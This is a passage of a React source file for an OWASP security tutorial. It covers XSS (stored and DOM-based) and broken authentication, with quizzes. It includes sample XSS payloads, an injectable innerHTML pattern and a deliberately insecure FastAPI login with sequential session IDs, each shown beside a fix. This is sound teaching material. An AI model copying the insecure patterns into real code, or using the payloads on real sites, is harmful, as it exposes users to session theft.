                      <code className="text-sm text-slate-300">{labResult.secure}</code>
                    </div>
                    <div className="mt-3 p-3 bg-green-900/20 rounded">
                      <p className="text-sm text-green-400 font-semibold mb-2">✓ Safe! HTML Escaping Applied:</p>
                      <div className="text-xs text-slate-300 space-y-1">
                        <p>• <code className="bg-slate-800 px-1 rounded">&lt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;lt;</code> (less than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">&gt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;gt;</code> (greater than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">"</code> → <code className="bg-slate-800 px-1 rounded">&amp;quot;</code> (quote)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">'</code> → <code className="bg-slate-800 px-1 rounded">&amp;#x27;</code> (apostrophe)</p>
                      </div>
                      <p className="text-sm text-slate-300 mt-2">
                        These conversions ensure the browser displays the characters as text instead of interpreting them as HTML/JavaScript code.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Stored XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-orange-500/30">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Understanding Stored XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  In a real Stored XSS scenario, malicious scripts are saved to the database and execute every time ANY user views the affected page.
                </p>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Example Flow:</p>
                  <div className="space-y-2 text-xs text-slate-300">
                    <p>1. Attacker posts comment: <code className="bg-slate-900 px-2 py-1 rounded text-red-300">&lt;script&gt;steal_cookie()&lt;/script&gt;</code></p>
                    <p>2. Comment stored in database WITHOUT sanitization</p>
                    <p>3. When Alice views comments → script executes, her cookie stolen</p>
                    <p>4. When Bob views comments → script executes, his cookie stolen</p>
                    <p>5. Every visitor gets attacked automatically!</p>
                  </div>
                  <div className="mt-3 p-2 bg-orange-900/20 border border-orange-500/50 rounded">
                    <p className="text-xs text-orange-400 font-semibold">⚠️ This is why Stored XSS is CRITICAL severity - one attack affects all users!</p>
                  </div>
                </div>
              </div>

              {/* DOM-based XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 border border-yellow-500/30">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Understanding DOM-Based XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  DOM-based XSS happens entirely in the browser. The malicious payload never reaches the server, making it invisible to server-side protections.
                </p>
                <div className="bg-slate-800 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Pattern:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-red-300">
{`// Reading from URL fragment (after #)
const name = window.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// Attack URL:
// https://site.com/page#<img src=x onerror=alert(1)>`}
                  </pre>
                </div>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Secure Alternative:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-green-300">
{`// Use textContent instead of innerHTML
const name = window.location.hash.substring(1);
document.getElementById('output').textContent = name;

// Or create text nodes
const textNode = document.createTextNode(name);
document.getElementById('output').appendChild(textNode);

// Manual HTML escaping function
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}`}
                  </pre>
                </div>
              </div>
            </div>

            <button
              onClick={() => setActiveTab('quiz')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
            >
              Ready for the Quiz? →
            </button>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// BROKEN AUTHENTICATION MODULE
// ============================================================================

const BrokenAuthModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');

  const vulnerableCode = `from fastapi import FastAPI, Response, Cookie
from typing import Optional

app = FastAPI()

# DANGEROUS: Predictable session IDs
session_counter = 1000

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """⚠️ VULNERABLE - Weak session management"""
    global session_counter
    
    # Simplified authentication (assume it works)
    if authenticate(username, password):
        # DANGEROUS: Predictable session ID
        session_id = str(session_counter)
        session_counter += 1
        
        # DANGEROUS: No secure flag, no httpOnly
        response.set_cookie(key="session", value=session_id)
        return {"message": "Logged in"}
    
    return {"error": "Invalid credentials"}`;

  const secureCode = `from fastapi import FastAPI, Response, Cookie
from typing import Optional
import secrets
import hashlib

app = FastAPI()

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """✅ SECURE - Strong session management"""
    
    # Authenticate user
    if authenticate(username, password):
        # ✅ SECURE: Cryptographically random session ID
        session_id = secrets.token_urlsafe(32)
        
        # ✅ SECURE: Hash the session ID before storing
        hashed_session = hashlib.sha256(session_id.encode()).hexdigest()
        
        # ✅ SECURE: HttpOnly, Secure, SameSite flags
        response.set_cookie(
            key="session",
            value=session_id,
            httponly=True,      # Prevents JavaScript access
            secure=True,        # HTTPS only
            samesite="strict",  # CSRF protection
            max_age=3600        # 1 hour expiration
        )
        
        return {"message": "Logged in securely"}
    
    return {"error": "Invalid credentials"}`;

  const comparisonCode = `from fastapi import FastAPI, Response
import secrets
import hashlib

app = FastAPI()

@app.post("/login")
async def login(username: str, password: str, response: Response):
    """✅ SECURE - Strong session management"""
    
    if authenticate(username, password):
        # ❌ OLD (VULNERABLE): Predictable sequential session ID
        # session_id = str(session_counter)
        # session_counter += 1
        
        # ✅ NEW (SECURE): Cryptographically random session ID
        session_id = secrets.token_urlsafe(32)
        
        # ✅ NEW: Hash session ID for storage
        hashed_session = hashlib.sha256(session_id.encode()).hexdigest()
        
        # ❌ OLD (VULNERABLE): No security flags
        # response.set_cookie(key="session", value=session_id)
        
        # ✅ NEW (SECURE): Secure cookie with all protection flags
        response.set_cookie(
            key="session",
            value=session_id,
            httponly=True,
            secure=True,
            samesite="strict",
            max_age=3600
        )
        
        return {"message": "Logged in"}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes a session ID predictable and insecure?",
      options: [
        "Using HTTPS",
        "Using sequential numbers or timestamps",
        "Setting expiration time",
        "Using cookies"
      ],
      correct: 1,
      explanation: "Sequential numbers or timestamps are predictable. Attackers can guess valid session IDs and hijack user sessions."
    },
    {
      id: 2,
      question: "What does the 'httponly' cookie flag prevent?",
      options: [
        "Cookie transmission over HTTP",
        "JavaScript access to the cookie",
        "Cookie expiration",
        "Cookie encryption"
      ],
      correct: 1,
      explanation: "The httponly flag prevents JavaScript from accessing the cookie, protecting against XSS attacks that try to steal session tokens."
    },
    {
      id: 3,
      question: "What Python module should you use to generate secure random session IDs?",
      options: [
        "random",
        "uuid",
        "secrets",
        "hashlib"
      ],
      correct: 2,
      explanation: "The secrets module is designed for generating cryptographically strong random numbers suitable for security purposes like session IDs."
    },
    {
      id: 4,
      question: "What does the 'samesite=strict' cookie attribute protect against?",
      options: [
        "SQL Injection",
        "XSS attacks",
        "CSRF attacks",
        "DDoS attacks"
      ],
      correct: 2,
      explanation: "SameSite=strict prevents the browser from sending the cookie with cross-site requests, protecting against CSRF (Cross-Site Request Forgery) attacks."
    }
  ];

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Lock className="w-10 h-10 text-yellow-400" />
            <h1 className="text-4xl font-bold">Broken Authentication</h1>
          </div>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Examples', icon: Code },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              
              <p className="text-slate-300 mb-4">
                Broken Authentication occurs when authentication mechanisms are implemented incorrectly, allowing attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="mt-4 bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3">Common Weaknesses:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• Predictable session IDs (sequential numbers)</li>
                  <li>• Missing HttpOnly/Secure cookie flags</li>
                  <li>• No session expiration</li>
                  <li>• Weak password requirements</li>
                  <li>• No account lockout after failed attempts</li>
                </ul>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔑 Account Takeover</h4>
                  <p className="text-sm text-slate-300">Attackers gain full access to user accounts</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🎭 Identity Theft</h4>
                  <p className="text-sm text-slate-300">Impersonate legitimate users</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">💳 Financial Fraud</h4>
                  <p className="text-sm text-slate-300">Unauthorized transactions and theft</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📊 Data Breaches</h4>
                  <p className="text-sm text-slate-300">Access to sensitive personal information</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>

              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button
                  onClick={() => setCodeView('comparison')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                  }`}
                >
                  Before/After Comparison
                </button>
                <button
                  onClick={() => setCodeView('sidebyside')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                  }`}
                >
                  Side-by-Side View
                </button>
              </div>

              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-green-400 mb-3">✅ Secure Code with Changes:</h4>
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}

              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Authentication Best Practices:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Use secrets module:</strong> Generate cryptographically random session IDs</li>
                  <li>• <strong>Cookie Security Flags:</strong> HttpOnly, Secure, SameSite</li>
                  <li>• <strong>Session Expiration:</strong> Set reasonable timeouts</li>
                  <li>• <strong>Multi-Factor Authentication:</strong> Add second verification factor</li>
                  <li>• <strong>Rate Limiting:</strong> Prevent brute-force attacks</li>
                  <li>• <strong>Password Hashing:</strong> Use bcrypt, Argon2, or PBKDF2</li>
                </ul>
              </div>
            </div>

            <button
              onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
            >
              Continue to Examples →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">📚 Security Examples</h3>
              
              <div className="space-y-4">
                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Generate Secure Session ID:</h4>
                  <PythonCode code={`import secrets

# Generate cryptographically strong random session ID
session_id = secrets.token_urlsafe(32)
print(session_id)  # Example: 'xQz9K-vN8pR2mL4wH3jC6tY7fG1sD5bA9'`} />
                </div>

                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Hash Passwords Securely:</h4>
                  <PythonCode code={`from passlib.hash import bcrypt

# Hash password with bcrypt
password_hash = bcrypt.hash("user_password")

# Verify password
is_valid = bcrypt.verify("user_password", password_hash)`} />
                </div>

                <div className="bg-slate-900 rounded-lg p-4">
                  <h4 className="font-bold mb-2 text-green-400">✅ Implement Rate Limiting:</h4>
                  <PythonCode code={`from fastapi import FastAPI, HTTPException
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()

@app.post("/login")
@limiter.limit("5/minute")  # Max 5 attempts per minute
async def login(username: str, password: str):
    # Authentication logic here
    pass`} />
                </div>
              </div>

              <button
                onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }}
                className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
              >
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

export default OWASPSecurityTutorial;